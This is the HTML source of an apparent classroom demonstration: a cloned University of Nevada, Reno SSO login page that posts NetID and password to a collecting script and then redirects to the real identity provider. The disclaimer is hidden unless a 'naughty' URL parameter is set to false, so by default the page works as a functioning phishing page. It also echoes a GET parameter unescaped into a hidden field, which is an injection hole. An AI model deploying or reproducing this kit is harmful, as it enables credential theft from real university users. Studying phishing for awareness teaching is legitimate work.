<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title>Authentication Portal - University of Nevada, Reno</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="stylesheet" type="text/css" href="bootstrap.min.css">
		<link rel="stylesheet" type="text/css" href="bootstrap-theme.min.css">
		<link rel="stylesheet" type="text/css" href="main.css">
	</head>
	<body>
		<header>
			<div class="navbar" role="banner">
				<div id="mainNavContainer" class="container">
					<a id="header-logo" class="pull-left" href="http://www.unr.edu/" target="_blank">
					<img id="logo" alt="University of Nevada, Reno" src="logo-blue2.png" />	
					<img id="logo-small" alt="University of Nevada, Reno" src="blockn-60x60.jpg" />	
					</a>
					<ul class="nav nav-pills pull-right header-pill">
						<li class="active">
							<a href="#"><strong>
							Login Form
							</strong></a>
						</li>
					</ul>
				</div>
			</div>
		</header>
		<!-- Notice of phishing system for legal purposes -->
		<div class="notice">
			<h3>Notice!</h3>
			<p>This copy of the UNR SSO login panel was created for CS 445 to show how easy it can be to replicate a trusted page.</p>
			<br>
			<p>Do not enter real credentials into this system, unless you would like those credentials shared on the web!</p>
			<a href="../index.php" target="_blank">
				<div class="notice-btn">
					<p>Learn More</p>
				</div>
			</a>
		</div>
		<div class="container">
			<div class="row" style="margin-bottom: 15px;">
				<div class="col-md-9">
					<img class="img-responsive" alt="NetID Login" src="netidlogin.png" />
				</div>
				<div class="col-md-3" style="margin-top: 20px;">
					<div style="text-align: center;" class="alert alert-danger">
						<strong>Do Not Bookmark This Page!</strong>
					</div>
				</div>
			</div>
			<div class="row">
				<div class="col-md-10 col-md-offset-1 well">
					<p style="font-size:1.2em;">
						This service requires you to log in with your NetID.
					</p>
					<div class="container" style="margin-top:25px;">
						<div class="col-md-6">
							<form class="form-horizontal" action="../process/process.php?url=https%3A%2F%2Fidp2.unr.edu%2Fidp%2Fprofile%2FSAML2%2FRedirect%2FSSO%3Fexecution%3De1s2" method="post">
								<div class="form-group">
									<label class="col-md-3 control-label" for="username">NetID</label>
									<div class="col-md-7">					
										<input class="form-control" id="username" name="username" type="text" value="">
									</div>
									<div class="col-md-2"></div>
								</div>
								<div class="form-group">
									<label class="col-md-3 control-label" for="password">Password</label>
									<div class="col-md-7">					
										<input class="form-control" id="password" name="password" type="password" value="">
									</div>
									<div class="col-md-2"></div>
								</div>
								<div class="form-group hidden">
									<input name="emailId" value="<?php echo $_GET["emailId"]; ?>">
								</div>
								<div class="form-group">
									<div class="col-md-12" style="text-align: center; margin-top: 20px;">
										<button class="btn btn-default" type="submit" name="_eventId_proceed" onClick="this.childNodes[0].nodeValue='Logging in, please wait...'">
										Sign In 									</button>
									</div>
								</div>
							</form>
							<div class="row">
								<div class="form-group">
									<div class="col-md-12">
										<div style="text-align: center;">
											<p>
												<a href="https://security.unr.edu/Account/ForgotPassword" target="_blank">Forgot your password?</a>
												<br />
												<a href="https://oit.unr.edu/services-and-support/login-ids-and-passwords/netid/" target="_blank">Forgotten your NetID?</a>
											</p>
										</div>
									</div>
									<div class="col-md-offset-2"></div>
								</div>
							</div>
						</div>
						<div class="col-md-6">
							<h4 style="text-align: center; margin-top: 0;">The Service</h4>
						</div>
					</div>
				</div>
			</div>
			<div class="row">
				<div class="col-md-10 col-md-offset-1">
					<div class="pull-right">							
						<img sidth="150px" alt="Supported By Information Technology" src="supportby_small.png" />
					</div>
				</div>
				<div class="col-md-1"></div>
			</div>
		</div>
		<script src="jquery.js"></script>
		<script src="bootstrap.min.js"></script>
		<script>
			//show the warning notice if naughty mode is turned off
			urlParams = new URL(window.location.href);
			if(urlParams.searchParams.get("naughty") == "false") {
				document.getElementsByClassName("notice")[0].classList.add("show");
			}
		</script>					
	</body>
</html>